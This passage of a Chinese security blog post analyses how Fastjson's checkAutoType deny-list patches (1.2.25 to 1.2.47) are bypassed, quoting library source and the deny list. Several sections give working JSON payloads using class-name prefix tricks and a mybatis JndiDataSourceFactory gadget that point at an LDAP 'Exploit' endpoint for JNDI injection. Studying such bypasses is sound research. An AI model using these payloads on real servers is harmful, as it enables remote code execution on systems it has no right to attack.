class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">            || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">           ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了梳理一下整个流程，这里准备了一个流程图</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png?x-oss-process=image/format,webp" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png?x-oss-process=image/format,webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>简单来说，新版本对fastjson反序列化的限制就是使用黑白名单的方式进行过滤，acceptList为白名单（默认为空）。denyList为黑名单（默认不为空）</p>
<p>默认autoTypeSupport为false，即先执行黑名单过滤，遍历denyList</p>
<p>黑名单denyList过滤列表如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>若正常执行1.2.24payload，则会爆出 autoType 不支持该类的错误</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786376949-5e3335da-be39-4b1b-a7fb-0f4f8e14f374.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786376949-5e3335da-be39-4b1b-a7fb-0f4f8e14f374.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="TK7hh">小结</h3>

<p>1.2.24之后的版本后，都是使用<code>checkAutoType()</code>函数，用黑白名单的方式来防御Fastjson反序列化漏洞，因此后面不同补丁的绕过都是基于<strong>黑名单</strong>的绕过</p>
<h2 id="pNCOM">1.2.25 - 1.2.41 补丁绕过</h2>
若按照以前的EXP直接运行，则爆出以下错误，说不支持该类，被黑名单ban了

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786919334-c0ca55a2-397d-4be3-92bb-71c89ff30734.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786919334-c0ca55a2-397d-4be3-92bb-71c89ff30734.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="eFTlY">绕过</h3>
这里只需要简单绕过以下，尝试在 com.sun.rowset.JdbcRowSetImpl 前面加一个 L，结尾加上 ; 绕过

<p>并且记住开启<code>AutoTypeSupport</code></p>
<p>运行后即可绕过黑名单，成功执行payload</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787151444-3145b40b-077a-49ab-9ecc-b5bb50b9ca82.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787151444-3145b40b-077a-49ab-9ecc-b5bb50b9ca82.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="mugdC">断点分析</h3>
<h4 id="KWoRr">黑名单绕过</h4>

<p>我们在<code>checkAutoType</code>处下一个断点，跟着看一下怎么绕过的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787378125-00f9330a-6e12-4e2f-862c-92bed5657524.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787378125-00f9330a-6e12-4e2f-862c-92bed5657524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在如下代码处，首先会进行黑名单校验，之前我们的异常就是在此处抛出的</p>
<p>由于我们对类名加上了<code>L</code>和<code>;</code>，所以这里被不会被拦截</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>下一步进入以下部分，这里是一个<strong>利用点</strong>，后面再说</p>
<p>这里会从Map缓存中查找此类，但是我们之前并没有加载过它，就无法找到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>下一步if条件中<code>!autoTypeSupport</code>，是false的，因此这里并没有什么影响</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后走到这里，我们的<code>autoTypeSupport</code>为true，直接走入核心方法<code>TypeUtils.loadClass</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="xQs2E">类加载</h4>

<p>在<code>loadClass</code>方法中，存在这么一个地方，它的功能就是，若以<code>L</code>开头<code>;</code>结尾，则会去除该开头和该结尾，恢复我们正常的类名</p>
<p>后续的类加载过程就不再多说</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="x8Nhs">1.2.25-1.2.42 补丁绕过</h2>

<p>新一个EXP是这样的，后续的补丁，会在黑名单过滤之前，先将开头<code>L</code>和结尾<code>;</code>提取出来，若我们写两个<code>L</code>和两个<code>;</code>，即可绕过限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, </span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741789028443-6b420e70-50d6-4226-8699-b726b50c8ba7.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741789028443-6b420e70-50d6-4226-8699-b726b50c8ba7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="o2cRk">1.2.25-1.2.43 补丁绕过</h2>
<h3 id="cCmD2">补丁</h3>

<p>在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836711524-627af9eb-2493-4e33-a232-eb7824eed90f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836711524-627af9eb-2493-4e33-a232-eb7824eed90f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="vZjrF">绕过</h3>
先给出EXP

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在1.2.43之前，运行后是可以执行恶意代码的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741834416864-b67f62d7-857d-476e-9d86-ad0b74e506ef.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741834416864-b67f62d7-857d-476e-9d86-ad0b74e506ef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="afalq">断点调试</h3>

<p>我们断点下到以下部分，这里会检查，<code>@type</code>的第一个字符是不是<code>[</code>，若第一个字符是<code>[</code>，则会删除第一个<code>[</code>，提取出来其中的类名，调用<code>Array.newInstance</code>，并<code>getClass</code>来获取返回类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后会进入<code>checkAutoType</code>函数，对<code>[com.sun.rowset.JdbcRowSetImpl</code>这个函数名进行黑白名单验证，类名前有一个<code>[</code>，所以当然不会被拦截</p>
<p>然后就该进行反序列化的操作了，进入到<code>deserialize</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741835271828-d5e51450-2262-4e7e-918c-f8721901b72b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741835271828-d5e51450-2262-4e7e-918c-f8721901b72b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在该方法中，我们之前的报错提示就是从<code>DefaultJSONParser.parseArray()</code>里面抛出的，进该方法的内部分析一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741835418601-fa78b706-bc88-4f06-bbb5-44e0fc2b5e8c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741835418601-fa78b706-bc88-4f06-bbb5-44e0fc2b5e8c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里就对我们后面的字符进行判断，判断其是否为<code>[</code>和<code>&#123;</code>，这里就是我们报错的原因，只需要将其一一满足即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (token != JSONToken.LBRACKET) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;exepct &#x27;[&#x27;, but &quot;</span> + JSONToken.name(token) + <span class="string">&quot;, &quot;</span> + lexer.info());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="AWOxF">1.2.25-1.2.45补丁绕过</h2>
<h3 id="oFqAi">补丁</h3>

<p>调试<code>checkAutoType()</code>函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常</p>
<h3 id="mqkIz">绕过</h3>

<ul>
<li>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本</li>
</ul>
<p>pom.xml文件导入如下（不知道为什么3.5.2版本也能行）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>绕过EXP如下，其中连ldap或rmi都可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">	<span class="string">&quot;properties&quot;</span>:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后可以成功执行恶意命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836187458-940809f1-200a-4d69-8d51-b480d9f3a6dc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836187458-940809f1-200a-4d69-8d51-b480d9f3a6dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="leQJ8">断点调试</h3>
从EXP分析，可以知道我们要去`JndiDataSourceFactory`这个类，并且寻找它对`properties`进行赋值的地方，其代码如下

<p>我把断点下载setter方法中，在该方法中，我们找到了熟悉的JNDI注入，即<code>initCtx.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的</p>
<p>所以我们可以很简单的就绕过该补丁限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      InitialContext initCtx;</span><br><span class="line">      <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> getEnvProperties(properties);</span><br><span class="line">      <span class="keyword">if</span> (env == <span class="literal">null</span>) &#123;</span><br><span class="line">        initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (properties.containsKey(INITIAL_CONTEXT)</span><br><span class="line">          &amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));</span><br><span class="line">        dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">        dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DataSourceException</span>(<span class="string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h2 id="f9642">1.2.25-1.2.47补丁绕过</h2>
<h3 id="FtLx3">分析</h3>

<p>在1.2.24版本之后，当在<code>DefaultJSONParser#parseObject</code>方法中检测到<code>@type</code>关键字后，会调用<code>checkAutoType</code>方法对所加载的类有所限制。而在1.2.24版本前，这个位置直接进行了<code>loadclass</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="literal">null</span>);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面即为<code>ParserConfig#checkAutoType</code>的代码，因为他的逻辑比较复杂，因此我跟着组长搞了一个流程图</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中，黄色部分为，可以实现类加载的地方</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们这里不分析其他地方，只在第二个返回类的地方做文章</p>
<p>首先他会从缓存中找有没有这个类，如果没有找到就从deserializers中继续找，这里它也是一个缓存，如果找到的话则会判断<code>是否期望类不为空且与期望类不一致</code>，如果判断为false的话就会返回这个类。这个条件在默认条件下为flase，因此我们只需要在缓存中存在这个类，即可返回这个类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>读取缓存时，是从<code>mappings</code>中寻找，所以我们需要寻找，在什么地方将类存入<code>mappings</code>的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们找到的可控的方法，为<code>TypeUtils#loadClass</code>方法</p>
<p>这代表的是，如果之前加载过这个类，就放入缓存中，下次加载的时候直接从缓存中拿出</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

